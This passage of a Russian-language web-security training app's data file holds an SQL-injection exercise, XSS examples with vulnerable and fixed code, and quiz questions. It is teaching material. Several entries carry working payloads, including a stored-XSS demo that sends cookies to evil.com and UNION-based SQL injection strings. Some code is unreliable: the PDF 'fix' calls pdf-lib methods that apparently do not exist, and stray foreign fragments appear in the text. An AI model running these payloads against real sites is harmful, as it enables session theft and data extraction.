    description: 'Создайте пейлоад, работающий в MySQL, PostgreSQL и SQLite одновременно.',
    initialQuery: `SELECT * FROM users\nWHERE username = '[ВВОД]'`,
    hint: 'Polyglot-пейлоад должен использовать синтаксис, валидный во всех СУБД. Используйте: -- для комментариев (работает везде), UNION SELECT, 0x для hex.',
    exampleInput: "1' UNION SELECT NULL,NULL,NULL-- -",
    explanation:
      'Polyglot SQLi — пейлоад, работающий в нескольких СУБД. Ключевые принципы: 1) Двойной дефис с пробелом (-- ) — стандартный SQL-комментарий. 2) UNION SELECT NULL — NULL работает во всех СУБД. 3) Одинарная кавычка — стандартный разделитель строк. 4) Точное количество NULL определяется числом столбцов оригинального запроса.',
    successQuery: `SELECT * FROM users\nWHERE username = '1' UNION SELECT NULL,NULL,NULL-- -`,
  },
];

// ============================================================
// XSS Types
// ============================================================
export const xssTypes = [
  {
    id: 'reflected',
    title: 'Отражённый XSS (Reflected XSS)',
    description:
      'Отражённый XSS возникает, когда вредоносный скрипт встраивается в ответ сервера как результат запроса, содержащего внедрённый код. Скрипт «отражается» от сервера к пользователю через URL-параметры, формы или заголовки.',
    vulnerableCode: `<!-- УЯЗВИМЫЙ КОД -->
<div>
  Результаты поиска для:
  <span id="search-result"></span>
</div>

<script>
  // Ввод пользователя вставляется напрямую без санитизации
  document.getElementById('search-result').innerHTML =
    new URLSearchParams(location.search).get('q');
  // Атака: ?q=<script>alert('XSS')</script>
  // Или: ?q=<img src=x onerror=alert('XSS')>
</script>`,
    secureCode: `<!-- БЕЗОПАСНЫЙ КОД -->
<div>
  Результаты поиска для:
  <span id="search-result"></span>
</div>

<script>
  // Используем textContent вместо innerHTML
  const query = new URLSearchParams(location.search).get('q');
  document.getElementById('search-result').textContent = query;

  // Или с серверной санитизацией (Node.js)
  const escapeHTML = (str) => str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
</script>`,
    attackDemo: '<script>alert("XSS-атака выполнена!")</script>',
    mitigation: 'Используйте textContent вместо innerHTML, кодируйте спецсимволы, применяйте Content Security Policy (CSP).',
  },
  {
    id: 'stored',
    title: 'Хранимый XSS (Stored XSS)',
    description:
      'Хранимый XSS — наиболее опасный тип, при котором вредоносный скрипт сохраняется на сервере (в базе данных, логах, комментариях) и выполняется при каждом отображении страницы. В отличие от отражённого XSS, жертве не нужно переходить по специальной ссылке — достаточно просто открыть страницу.',
    vulnerableCode: `<!-- УЯЗВИМЫЙ КОД —评论区 -->
<div class="comments">
  <!-- Комментарии из базы данных -->
  <div class="comment">
    <strong>Пользователь</strong>
    <p>{{comment.text}}</p>
    <!-- Если в comment.text содержится:
         <script>stealCookies()</script>
         Он будет выполнен для КАЖДОГО посетителя!
    -->
  </div>
</div>

<!-- Express.js backend -->
app.post('/api/comments', (req, res) => {
  // Сохраняем комментарий без санитизации
  db.query('INSERT INTO comments (text) VALUES (?)',
    [req.body.text]);
});`,
    secureCode: `<!-- БЕЗОПАСНЫЙ КОД -->
<div class="comments">
  <div class="comment">
    <strong>Пользователь</strong>
    <!-- Используем HTML-кодирование -->
    <p>{{escapeHTML(comment.text)}}</p>
  </div>
</div>

<!-- Backend с санитизацией -->
const DOMPurify = require('dompurify');
app.post('/api/comments', (req, res) => {
  // Санитизируем HTML перед сохранением
  const cleanText = DOMPurify.sanitize(req.body.text, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong'],
    ALLOWED_ATTR: []
  });
  db.query('INSERT INTO comments (text) VALUES (?)', [cleanText]);
});`,
    attackDemo: '<script>document.location="https://evil.com/steal?cookie="+document.cookie</script>',
    mitigation: 'Санитизируйте ввод перед сохранением в БД. Используйте DOMPurify для очистки HTML. Применяйте CSP заголовки.',
  },
  {
    id: 'dom',
    title: 'DOM-based XSS',
    description:
      'DOM-based XSS возникает, когда уязвимость находится в клиентском JavaScript-коде, который модифицирует DOM-дерево на основе данных из ненадёжного источника. В отличие от отражённого и хранимого XSS, вредоносный код вообще не отправляется на сервер — вся атака происходит в браузере.',
    vulnerableCode: `// УЯЗВИМЫЙ КОД — на стороне клиента
// Чтение данных из location.hash (фрагмента URL)
const userInput = location.hash.substring(1);

// Опасно — вставка HTML через innerHTML
document.getElementById('welcome').innerHTML =
  'Добро пожаловать, ' + userInput + '!';

// Атака: #<img src=x onerror=alert('XSS')>
// Результат: <div id="welcome">
//   Добро пожаловать, <img src=x onerror=alert('XSS')>!
// </div>

// Другие опасные источники:
// - document.referrer
// - document.cookie
// - window.name
// - localStorage/sessionStorage
// - postMessage`,
    secureCode: `// БЕЗОПАСНЫЙ КОД
const userInput = location.hash.substring(1);

// Вариант 1: Использовать textContent
document.getElementById('welcome').textContent =
  'Добро пожаловать, ' + userInput + '!';

// Вариант 2: Кодирование спецсимволов
function escapeHTML(str) {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
}

document.getElementById('welcome').innerHTML =
  'Добро пожаловать, ' + escapeHTML(userInput) + '!';

// Вариант 3: Использовать URI-кодирование
const safeInput = decodeURIComponent(userInput);
// Всегда валидируйте входные данные!`,
    attackDemo: '#<img src=x onerror="document.body.style.background=\'red\'">',
    mitigation: 'Используйте textContent, а не innerHTML. Кодируйте данные из location.hash, document.referrer и других клиентских источников.',
  },
  {
    id: 'svg',
    title: 'SVG XSS',
    description:
      'XSS через SVG-файлы — внедрение JavaScript в SVG-изображения. SVG поддерживает JavaScript, что позволяет злоумышленникам внедрять скрипты в «изображения», загружаемые на сайт.',
    vulnerableCode: `<!-- УЯЗВИМЫЙ КОД — загрузка SVG без проверки -->
<img src="/uploads/user-avatar.svg" alt="Avatar">

<!-- Содержимое malicious.svg: -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
  <!-- Или через обработчик событий: -->
  <svg onload="alert(document.cookie)">
  <!-- Или через animate: -->
  <animate onbegin="alert(1)" attributeName="x" />
</svg>

<!-- Сервер принимает SVG без проверки: -->
app.post('/upload', (req, res) => {
  // Проверяет только Content-Type: image/svg+xml
  // Но не проверяет содержимое на script/handler
  fs.writeFile(req.file.path, req.file.buffer);
});`,
    secureCode: `<!-- БЕЗОПАСНЫЙ КОД — использовать img с CSP -->
<!-- Заголовок CSP блокирует inline-скрипты в SVG: -->
<!-- Content-Security-Policy: script-src 'self' -->

<!-- Или конвертировать SVG в PNG на сервере: -->
const sharp = require('sharp');
app.post('/upload', async (req, res) => {
  if (req.file.mimetype === 'image/svg+xml') {
    // Конвертируем в PNG — JavaScript теряется
    await sharp(req.file.buffer)
      .png()
      .toFile(\`uploads/\${req.file.filename}.png\`);
  }
});

<!-- Или использовать object с sandbox: -->
<object data="safe.svg" type="image/svg+xml"
        sandbox="allow-same-origin">
</object>`,
    attackDemo: '<svg onload="alert(document.cookie)"><circle cx="50" cy="50" r="40"/></svg>',
    mitigation: 'Конвертируйте SVG в PNG на сервере. Используйте CSP для блокировки inline-скриптов. Санитизируйте SVG через DOMPurify с удалением <script> и обработчиков событий.',
  },
  {
    id: 'markdown',
    title: 'Markdown XSS',
    description:
      'XSS через Markdown-рендеринг — многие парсеры Markdown позволяют HTML-разметку внутри текста, что может быть использовано для внедрения скриптов.',
    vulnerableCode: `<!-- УЯЗВИМЫЙ КОД — Markdown с HTML -->
<!-- Пользовательский ввод: -->
<!-- [Click here](javascript:alert('XSS')) -->
<!-- Или: <img src=x onerror=alert('XSS')> -->

const md = require('markdown-it')();
const html = md.render(userInput);
document.getElementById('content').innerHTML = html;

<!-- markdown-it по умолчанию разрешает HTML -->
<!-- React с marked: -->
import marked from 'marked';
function Comment({ text }) {
  return <div dangerouslySetInnerHTML={{
    __html: marked(text)  // HTML не санитизирован!
  }} />;
}`,
    secureCode: `<!-- БЕЗОПАСНЫЙ КОД — санитизация Markdown -->
import DOMPurify from 'dompurify';
import marked from 'marked';

function Comment({ text }) {
  const rawHtml = marked(text);
  const cleanHtml = DOMPurify.sanitize(rawHtml, {
    ALLOWED_TAGS: ['p', 'strong', 'em', 'code', 'pre', 'ul', 'ol', 'li', 'h1', 'h2', 'h3', 'blockquote'],
    ALLOWED_ATTR: ['href', 'title'],
    FORBID_ATTR: ['onerror', 'onload', 'onclick'],
    FORBID_TAGS: ['script', 'iframe', 'object', 'embed', 'form']
  });
  return <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />;
}

<!-- Или отключить HTML в markdown-it: -->
const md = require('markdown-it')({ html: false });`,
    attackDemo: '[Click here](javascript:alert(document.cookie))\n\n<img src=x onerror=alert("XSS")>',
    mitigation: 'Отключите HTML в Markdown-парсере (html: false). Используйте DOMPurify для санитизации результата. Запретите javascript: URL-схемы.',
  },
  {
    id: 'pdf',
    title: 'PDF XSS',
    description:
      'XSS через PDF-файлы — встроенный PDF-просмотрщик браузера может выполнять JavaScript из PDF-документов через Embedded Files и JavaScript API PDF.',
    vulnerableCode: `<!-- УЯЗВИМЫЙ КОД -- PDF с JavaScript -->
<!-- PDF может содержать: -->
<!-- this.disclosedDoc = true; -->
<!-- app.alert("XSS"); -->
<!-- -->

<!-- Сервер разрешает загрузку PDF: -->
app.post('/upload-pdf', (req, res) => {
  // Проверяет только расширение .pdf
  // Но не проверяет содержимое на JavaScript
  if (req.file.originalname.endsWith('.pdf')) {
    fs.writeFile(req.file.path, req.file.buffer);
  }
});

<!-- Пользователь открывает PDF в браузере: -->
<embed src="/uploads/report.pdf" type="application/pdf">
<!-- PDF.js или встроенный просмотрщик может выполнить JS -->`,
    secureCode: `<!-- БЕЗОПАСНЫЙ КОД -- санитизация PDF -->
const { PDFDocument } = require('pdf-lib');

app.post('/upload-pdf', async (req, res) => {
  const pdf = await PDFDocument.load(req.file.buffer);
  // Удаляем все JavaScript из PDF
  pdf.setJavaScript([]);
  pdf.setJavaScriptForAction([]);
  // Удаляем встроенные файлы
  pdf.removeEmbeddedFiles();
  const cleanBuffer = await pdf.save();
  fs.writeFile(req.file.path, cleanBuffer);
});

<!-- Или конвертировать в изображения: -->
<!-- Использовать pdf2pic или similar -->
<embed src="/uploads/report.pdf#toolbar=0&navpanes=0" type="application/pdf">`,
    attackDemo: 'PDF с встроенным JavaScript: this.disclosedDoc = true; app.alert("XSS");',
    mitigation: 'Удаляйте JavaScript из PDF на сервере (pdf-lib). Конвертируйте PDF в изображения. Используйте песочницу для просмотра. Устанавливайте Content-Disposition: attachment.',
  },
];

// ============================================================
// Quiz Questions
// ============================================================
export interface QuizQuestion {
  id: string;
  category: string;
  difficulty: 'easy' | 'medium' | 'hard';
  question: string;
  options: string[];
  correctIndex: number;
  explanation: string;
}

export const quizQuestions: QuizQuestion[] = [
  // SQL Injection
  {
    id: 'sql-1',
    category: 'SQL-инъекции',
    difficulty: 'easy',
    question: 'Какой метод лучше всего защищает от SQL-инъекций?',
    options: [
      'Фильтрация спецсимволов на клиенте',
      'Параметризованные запросы (prepared statements)',
      'Использование HTTPS',
      'Скрытие названий таблиц',
    ],
    correctIndex: 1,
    explanation:
      'Параметризованные запросы разделяют SQL-код и данные, что полностью исключает возможность инъекции. Данные передаются как параметры и не могут изменить структуру запроса, даже если содержат SQL-команды.',
  },
  {
    id: 'sql-2',
    category: 'SQL-инъекции',
    difficulty: 'easy',
    question: 'Что делает ввод "\\\' OR \\\'1\\\'=\\\'1" в форме логина?',
    options: [
      'Создаёт нового пользователя',
      'Заставляет условие WHERE быть всегда истинным',
      'Удаляет таблицу пользователей',
      'Блокирует доступ к базе данных',
    ],
    correctIndex: 1,
    explanation:
      'Эта строка закрывает кавычку username и добавляет OR \\\'1\\\'=\\\'1\\\'. Поскольку 1=1 всегда истинно, запрос возвращает все строки таблицы пользователей, что позволяет войти без знания реального пароля.',
  },
  {
    id: 'sql-3',
    category: 'SQL-инъекции',
    difficulty: 'easy',
    question: 'Для чего используется SQL-комментарий (-- ) при атаке?',
    options: [
      'Для ускорения выполнения запроса',
      'Для комментирования оставшейся части SQL-запроса',
      'Для обхода фаервола',
      'Для шифрования запроса',
    ],
    correctIndex: 1,
    explanation:
      'SQL-комментарий (-- ) превращает всё после него в комментарий. Это позволяет злоумышленнику «обрезать» ненужную часть запроса (например, проверку пароля), оставляя только нужное условие.',
  },
  {
    id: 'sql-4',
    category: 'SQL-инъекции',
    difficulty: 'medium',
    question: 'Какой оператор позволяет объединить результаты двух SELECT-запросов?',
    options: ['JOIN', 'UNION', 'MERGE', 'COMBINE'],
    correctIndex: 1,
    explanation:
      'UNION объединяет результаты двух или более SELECT-запросов в один набор. При SQL-инъекции злоумышленник может использовать UNION SELECT для извлечения данных из других таблиц.',
  },
  {
    id: 'sql-5',
    category: 'SQL-инъекции',
    difficulty: 'medium',
    question: 'Что такое «слепая» SQL-инъекция (Blind SQL Injection)?',
    options: [
      'Инъекция без использования SQL-комментариев',
      'Атака, при которой сервер не возвращает данные напрямую, а отвечает «да/нет»',
      'Инъекция через аудиоканал',
      'Атака на мобильные приложения',
    ],
    correctIndex: 1,
    explanation:
      'При слепой SQL-инъекции сервер не отображает результаты запроса, но злоумышленник может делать логические выводы по поведению приложения (оно показывает разные страницы при истинных и ложных условиях). Это позволяет постепенно извлекать данные посимвольно.',
  },
  // XSS
  {
    id: 'xss-1',
    category: 'XSS-атаки',
    difficulty: 'easy',
    question: 'В чём главное отличие DOM-based XSS от отражённого?',
    options: [
      'DOM XSS работает только в Chrome',
      'При DOM XSS вредоносный код вообще не отправляется на сервер',
      'Отражённый XSS более опасный',
      'DOM XSS требует HTTPS',
    ],
    correctIndex: 1,
    explanation:
      'DOM-based XSS полностью выполняется на стороне клиента. Вредоносный код содержится в URL-фрагменте, location.hash или другом клиентском источнике и модифицирует DOM напрямую через JavaScript, вообще не взаимодействуя с сервером.',
  },
  {
    id: 'xss-2',
    category: 'XSS-атаки',
    difficulty: 'easy',
    question: 'Какое свойство JavaScript безопаснее для вставки текста?',
    options: ['innerHTML', 'outerHTML', 'textContent', 'document.write'],
    correctIndex: 2,
    explanation:
      'textContent вставляет только текст, автоматически кодируя спецсимволы. HTML-теги не интерпретируются как разметка, что предотвращает XSS-атаки. innerHTML и document.write интерпретируют HTML, что делает их опасными.',
  },
  {
    id: 'xss-3',
    category: 'XSS-атаки',
    difficulty: 'easy',
    question: 'Что делает HTTP-заголовок Content Security Policy (CSP)?',
    options: [
      'Шифрует содержимое страницы',
      'Ограничивает источники, откуда можно загружать скрипты и ресурсы',
      'Ускоряет загрузку страницы',
      'Включает сжатие данных',
    ],
    correctIndex: 1,
    explanation:
      'CSP позволяет указать допустимые источники для скриптов, стилей, изображений и других ресурсов. Например, Content-Security-Policy: script-src \\\'self\\\' запрещает загрузку скриптов из любых источников, кроме текущего домена, что блокирует большинство XSS-атак.',
  },
  {
    id: 'xss-4',
    category: 'XSS-атаки',
    difficulty: 'medium',
    question: 'Какой тип XSS наиболее опасный?',
    options: ['Отражённый', 'DOM-based', 'Хранимый (Stored)', 'Все одинаково опасны'],
    correctIndex: 2,
    explanation:
      'Хранимый XSS наиболее опасен, потому что вредоносный код сохраняется на сервере и выполняется для каждого пользователя, открывающего страницу. Злоумышленнику достаточно один раз внедрить скрипт, и он будет работать постоянно.',
  },
  {
    id: 'xss-5',
    category: 'XSS-атаки',
    difficulty: 'medium',
    question: 'Какой атрибут HTML-тега чаще всего используется для XSS-атак?',
    options: ['style', 'class', 'onerror / onload / onclick', 'href'],
    correctIndex: 2,
    explanation:
      'Обработчики событий (onerror, onload, onclick и др.) позволяют выполнить JavaScript при определённых событиях. Например, <img src=x onerror=alert(1)> выполнит alert при ошибке загрузки изображения. Атрибут style может использоваться для CSS-инъекций, но менее опасен.',
  },
  // CSRF
  {
    id: 'csrf-1',
    category: 'CSRF',
    difficulty: 'easy',
    question: 'Что такое CSRF-атака?',
    options: [
      'Кража паролей через поддельный сайт',
      'Выполнение нежелательных действий от имени аутентифицированного пользователя',
      'Перехват сетевого трафика',
      'DDoS-атака на сервер',
    ],
    correctIndex: 1,
    explanation:
      'CSRF (Cross-Site Request Forgery) — это атака, при которой злоумышленник заставляет браузер жертвы отправить HTTP-запрос к уязвимому сайту. Поскольку браузер автоматически прикрепляет куки аутентификации, сервер воспринимает запрос как легитимный.',
  },
  {
    id: 'csrf-2',
    category: 'CSRF',
    difficulty: 'easy',
    question: 'Какой механизм наиболее эффективен для защиты от CSRF?',
    options: [
      'Использование HTTPS',
      'CSRF-токены (anti-CSRF tokens)',
      'Сложные пароли',
      'Rate Limiting',
    ],
    correctIndex: 1,
    explanation:
      'CSRF-токены — это уникальные случайные значения, сервер генерирует их для каждой сессии или формы. При отправке запроса токен должен быть включён, и сервер проверяет его валидность. Злоумышленник не может получить токен из-за политики одного источника (Same-Origin Policy).',
  },
  {
    id: 'csrf-3',
    category: 'CSRF',
    difficulty: 'easy',
    question: 'Какое значение cookie-атрибута SameSite обеспечивает лучшую защиту?',
    options: ['None', 'Lax', 'Strict', 'Off'],
    correctIndex: 2,
    explanation:
      'SameSite=Strict запрещает отправку куки с любыми кросс-сайтовыми запросами. SameSite=Lax разрешает куки для навигации (GET-запросов по ссылке), но блокирует для POST-запросов из форм. None не ограничивает отправку и требует Secure-атрибут.',
  },
  {
    id: 'csrf-4',
    category: 'CSRF',
    difficulty: 'medium',
    question: 'Почему браузер автоматически отправляет куки при CSRF-атаке?',
    options: [
      'Из-за бага в браузере',
      'Это стандартное поведение HTTP-куки',
      'Злоумышленник заставляет его это делать',
      'Только в старых браузерах',
    ],
    correctIndex: 1,
    explanation:
      'По спецификации HTTP, браузер автоматически прикрепляет куки к запросам к домену, для которого они установлены. Это фундаментальное поведение куки. Злоумышленник создаёт страницу, которая отправляет запрос к целевому сайту, и браузер автоматически включает куки аутентификации.',
  },
  {
    id: 'csrf-5',
    category: 'CSRF',
    difficulty: 'medium',
    question: 'Почему AJAX-запросы с CORS не защищают от CSRF по умолчанию?',
    options: [
      'CORS блокирует все кросс-доменные запросы',
      'Формы HTML не подчиняются CORS — они могут отправлять POST без preflight',
      'AJAX-запросы не используют куки',
      'CORS нужен только для WebSocket',
    ],
    correctIndex: 1,
    explanation:
      'HTML-формы (<form>) могут отправлять POST-запросы к любому домену без проверки CORS. CORS (и preflight-запросы) применяется только к определённым типам AJAX-запросов. Поэтому CSRF-атака через скрытую HTML-форму полностью обходит CORS.',
  },
  // Auth
  {
    id: 'auth-1',
    category: 'Аутентификация',
    difficulty: 'easy',
    question: 'Какой алгоритм рекомендуется для хеширования паролей?',
    options: ['MD5', 'SHA-256', 'bcrypt', 'Base64'],
    correctIndex: 2,
    explanation:
      'bcrypt специально разработан для хеширования паролей. Он включает соль (salt) для защиты от rainbow-таблиц и настраиваемый фактор сложности (cost), который замедляет перебор. MD5 устарел и уязвим, SHA-256 слишком быстрый, Base64 — это кодировка, не хеширование.',
  },
  {
    id: 'auth-2',
    category: 'Аутентификация',
    difficulty: 'easy',
    question: 'Что такое «соль» (salt) при хешировании паролей?',
    options: [
      'Зашифрованный пароль',
      'Случайные данные, добавляемые к паролю перед хешированием',
      'Ключ для расшифровки хеша',
      'Второй фактор аутентификации',
    ],
    correctIndex: 1,
    explanation:
      'Соль — это случайное значение, уникальное для каждого пользователя, которое добавляется к паролю перед хешированием. Это предотвращает использование заранее вычисленных таблиц (rainbow tables) и обеспечивает, что одинаковые пароли имеют разные хеши.',
  },
  {
    id: 'auth-3',
    category: 'Аутентификация',
    difficulty: 'medium',
    question: 'Какой принцип безопасности нарушается, если сервер возвращает разные сообщения для «пользователь не найден» и «неправильный пароль»?',
    options: [
      'Принцип наименьших привилегий',
      'Защита от перебора (brute-force protection)',
      'Защита от перечисления пользователей (user enumeration)',
      'Разделение обязанностей',
    ],
    correctIndex: 2,
    explanation:
      'Разные сообщения позволяют злоумышленнику определить, существует ли аккаунт с указанным email. Злоумышленник может перебирать email-адреса и собирать список пользователей для последующих атак. Правильный подход — единое сообщение: «Неверные учётные данные».',
  },
  {
    id: 'auth-4',
    category: 'Аутентификация',
    difficulty: 'medium',
    question: 'Что такое JWT (JSON Web Token)?',
    options: [
      'Способ шифрования данных',
      'Токен для хранения пароля в браузере',
      'Подписанный/зашифрованный набор данных для передачи информации между сторонами',
      'База данных пользователей',
    ],
    correctIndex: 2,
    explanation:
      'JWT — это компактный, URL-безопасный токен, состоящий из трёх частей: Header (заголовок с алгоритмом), Payload (полезные данные, такие как id и роль пользователя) и Signature (подпись, обеспечивающая целостность). Он используется для аутентификации и авторизации без хранения состояния на сервере.',
  },
  {
    id: 'auth-5',
    category: 'Аутентификация',
    difficulty: 'hard',
    question: 'Сколько символов должен содержать надёжный пароль?',
    options: [
      'Минимум 6 символов',
      'Минимум 8 символов',
      'Минимум 12 символов',
      'Минимум 4 символа',
    ],
    correctIndex: 2,
    explanation:
      'Современные рекомендации NIST и других организаций предполагают минимум 12 символов для пароля. Длина является критически важным фактором безопасности — каждый дополнительный символ экспоненциально увеличивает время перебора. Пароль из 12+ символов с разными типами символов обеспечивает надёжную защиту.',
  },
  // General
  {
    id: 'general-1',
    category: 'Общая безопасность',
    difficulty: 'easy',
    question: 'Что такое OWASP?',
    options: [
      'Программный продукт для защиты серверов',
      'Международная организация по безопасности приложений',
      'Тип атаки на веб-приложения',
      'Язык программирования',
    ],
    correctIndex: 1,
    explanation:
      'OWASP (Open Worldwide Application Security Project) — это некоммерческая организация, которая занимается улучшением безопасности программного обеспечения. Её самым известным проектом является OWASP Top 10 — список десяти наиболее критических угроз безопасности веб-приложений.',
  },
  {
    id: 'general-2',
    category: 'Общая безопасность',
    difficulty: 'easy',
    question: 'Что такое Principle of Least Privilege (Принцип наименьших привилегий)?',
    options: [
      'Каждый пользователь должен иметь права администратора',
      'Каждому процессу и пользователю предоставляются минимально необходимые права',
      'Только администратор может получать доступ к данным',
      'Все пользователи равны в правах',
    ],
    correctIndex: 1,
    explanation:
      'Принцип наименьших привилегий означает, что каждому пользователю, процессу и системе должны предоставляться только те права, которые необходимы для выполнения их задач. Это ограничивает потенциальный ущерб при компрометации аккаунта или уязвимости.',
  },
  {
    id: 'general-3',
    category: 'Общая безопасность',
    difficulty: 'easy',
    question: 'Что такое HTTP-заголовок X-Frame-Options?',
    options: [
      'Определяет размер кадра изображения',
      'Предотвращает кликджекинг (clickjacking) — встраивание сайта в iframe',
      'Включает фреймворк JavaScript',
      'Настройка анимации',
    ],
    correctIndex: 1,
    explanation:
      'X-Frame-Options указывает браузеру, можно ли встраивать страницу в <frame> или <iframe>. Значение DENY полностью запрещает встраивание, SAMEORIGIN разрешает только с того же домена. Это защита от кликджекинга — атаки, при которой невидимый iframe с целевым сайтом накладывается на видимые элементы.',
  },
  {
    id: 'general-4',
    category: 'Общая безопасность',
    difficulty: 'easy',
    question: 'Что такое SSRF (Server-Side Request Forgery)?',
    options: [
      'Кража данных с сервера через forged request',
      'Когда сервер делает запросы к внутренним ресурсам по указанию злоумышленника',
      'Атака на DNS-сервер',
      'Подмена IP-адреса',
    ],
    correctIndex: 1,
    explanation:
      'SSRF позволяет злоумышленнику заставить серверное приложение делать HTTP-запросы к указанным URL. Это может быть использовано для доступа к внутренним ресурсам, облачным метаданным (например, AWS 169.254.169.254) или для сканирования внутренней сети.',
  },
  {
    id: 'general-5',
    category: 'Общая безопасность',
    difficulty: 'easy',
    question: 'Что означает акроним HTTPS?',
    options: [
      'HyperText Transfer Protocol Secure',
      'High Tech Transfer Protocol System',
      'HyperText Transfer Protocol Server',
      'HyperText Transfer Protocol Standard',
    ],
    correctIndex: 0,
    explanation:
      'HTTPS (HyperText Transfer Protocol Secure) — это расширение протокола HTTP, использующее шифрование TLS/SSL для защиты передаваемых данных. Это обеспечивает конфиденциальность (данные нельзя прочитать), целостность (данные нельзя изменить) и аутентификацию (сервер — это тот, за кого он себя выдаёт).',
  },
  // --- Additional General Security Questions ---
  {
    id: 'general-6',
    category: 'Общая безопасность',
    difficulty: 'medium',
    question: 'Что такое «Defense in Depth» (Глубокая защита)?',
    options: [
      'Использование одного мощного средства защиты',
      'Многослойная стратегия безопасности с несколькими уровнями защиты',
      'Шифрование данных на нескольких уровнях OSI',
      'Многофакторная аутентификация',
    ],
    correctIndex: 1,
    explanation:
      'Defense in Depth — это стратегия, при которой используются несколько уровней защиты (фаерволы, IDS/IPS, шифрование, контроль доступа, мониторинг). Если один уровень будет преодолён, остальные продолжат защищать систему.',
  },
  {
    id: 'general-7',
    category: 'Общая безопасность',
    difficulty: 'medium',
    question: 'Какой HTTP-заголовок запрещает браузеру отображать страницу в iframe?',
    options: [
      'X-Content-Type-Options',
      'X-Frame-Options: DENY',
      'Strict-Transport-Security',
      'X-XSS-Protection',
    ],
    correctIndex: 1,
    explanation:
      'X-Frame-Options: DENY полностью запрещает браузеру отображать страницу в iframe, frame или object. Это предотвращает кликджекинг-атаки. Альтернатива — CSP-директива frame-ancestors.',
  },
  {
    id: 'general-8',
    category: 'Общая безопасность',
    difficulty: 'medium',
    question: 'Что такое «Zero Day» (0-day) уязвимость?',
    options: [
      'Уязвимость, которая была обнаружена и исправлена',
      'Уязвимость, о которой разработчики ещё не знают и для которой нет патча',
      'Уязвимость, существующая менее одного дня',
      'Уязвимость только в мобильных приложениях',
    ],
    correctIndex: 1,
    explanation:
      'Zero Day — уязвимость, о которой разработчик ещё не знает (или не выпустил патч). Злоумышленники могут эксплуатировать её до того, как будет выпущено исправление. Название происходит от количества дней, прошедших с момента обнаружения.',
  },
  {
    id: 'general-9',
    category: 'Общая безопасность',
    difficulty: 'medium',
    question: 'Что делает HTTP-заголовок Strict-Transport-Security (HSTS)?',
    options: [
      'Запрещает загрузку скриптов с других доменов',
      'Заставляет браузер использовать только HTTPS для данного домена',
      'Отключает кэширование страницы',
      'Включает двухфакторную аутентификацию',
    ],
    correctIndex: 1,
    explanation:
      'HSTS (HTTP Strict Transport Security) указывает браузеру всегда использовать HTTPS для данного домена, даже если пользователь вводит http://. Это предотвращает downgrade-атаки и перехват сессии через незашифрованное соединение.',
  },
  {
    id: 'general-10',
    category: 'Общая безопасность',
    difficulty: 'medium',
    question: 'Что такое «Security by Design»?',
    options: [
      'Добавление безопасности после разработки',
      'Интеграция вопросов безопасности на каждом этапе разработки (SDLC)',
      'Использование только платных инструментов защиты',
      'Тестирование безопасности перед релизом',
    ],
    correctIndex: 1,
    explanation:
      'Security by Design — подход, при котором безопасность встроена в процесс разработки с самого начала (требования, проектирование, кодирование, тестирование, деплой). Это дешевле и эффективнее, чем добавление безопасности после завершения разработки.',
  },
  // --- Additional SQL Injection Questions ---
  {
    id: 'sql-6',
    category: 'SQL-инъекции',
    difficulty: 'medium',
    question: 'Что такое «Second-order SQL Injection»?',
    options: [
      'Инъекция, выполняемая через второй запрос',
      'Инъекция, при которой payload сохраняется в БД и активируется при последующем использовании данных',
      'Две инъекции одновременно',
      'Инъекция через ORDER BY',
    ],
    correctIndex: 1,
    explanation:
      'Second-order SQLi происходит в два этапа: вредоносный payload сохраняется в БД через看似 безобидный ввод (например, регистрация), а затем активируется при использовании этих данных в другом запросе. Многие разработчики санитизируют ввод, но забывают о выходе данных.',
  },
  {
    id: 'sql-7',
    category: 'SQL-инъекции',
    difficulty: 'hard',
    question: 'Какой запрос показывает количество столбцов в таблице при UNION-атаке?',
    options: [
      'SELECT COUNT(*) FROM table',
      'ORDER BY 1, ORDER BY 2, ... до ошибки',
      'DESCRIBE table',
      'SHOW COLUMNS FROM table',
    ],
    correctIndex: 1,
    explanation:
      'ORDER BY N — стандартный метод определения числа столбцов. Злоумышленник увеличивает N (ORDER BY 1, ORDER BY 2, ...) до тех пор, пока не появится ошибка «Unknown column». Предыдущее значение N равно количеству столбцов, что необходимо для UNION SELECT.',
  },
  {
    id: 'sql-8',
    category: 'SQL-инъекции',
    difficulty: 'hard',
    question: 'Что делает функция GROUP_CONCAT() в MySQL при SQL-инъекции?',
    options: [
      'Группирует данные по категориям',
      'Объединяет значения нескольких строк в одну строку',
      'Удаляет дубликаты из результатов',
      'Создаёт резервную копию таблицы',
    ],
    correctIndex: 1,
    explanation:
      'GROUP_CONCAT() объединяет значения из нескольких строк в одну строку через разделитель. При SQL-инjection это позволяет извлечь все имена таблиц или все пароли в одном результате, что удобно для exfiltration данных.',
  },
  {
    id: 'sql-9',
    category: 'SQL-инъекции',
    difficulty: 'hard',
    question: 'Какая таблица information_schema содержит список всех таблиц в MySQL?',
    options: [
      'information_schema.columns',
      'information_schema.tables',
      'information_schema.databases',
      'information_schema.schema',
    ],
    correctIndex: 1,
    explanation:
      'information_schema.tables — мета-таблица MySQL, содержащая информацию обо всех табрах во всех базах данных. Злоумышленник может использовать SELECT table_name FROM information_schema.tables для получения списка таблиц.',
  },
  {
    id: 'sql-10',
    category: 'SQL-инъекции',
    difficulty: 'hard',
    question: 'Какой метод защиты от SQL-инъекций НЕ является достаточным?',
    options: [
      'Параметризованные запросы (prepared statements)',
      'Хранимые процедуры (stored procedures)',
      'Экранирование кавычек ( addslashes / mysqli_real_escape_string )',
      'ORM с параметризированными запросами',
    ],
    correctIndex: 2,
    explanation:
      'Экранирование кавычек недостаточно, так как SQL-инъекции возможны без кавычек (числовые поля, ORDER BY, LIMIT и т.д.). Кроме того, экранирование зависит от кодировки и может быть обойдено. Параметризованные запросы — надёжный метод защиты.',
  },
  // --- Additional XSS Questions ---
  {
    id: 'xss-6',
    category: 'XSS-атаки',
    difficulty: 'hard',
    question: 'Какой HTTP-заголовок CSP блокирует inline-скрипты?',
    options: [
      'Content-Security-Policy: default-src \'self\'',
      'Content-Security-Policy: script-src \'self\'',
      'Content-Security-Policy: style-src \'self\'',
      'Content-Security-Policy: img-src \'self\'',
    ],
    correctIndex: 1,
    explanation:
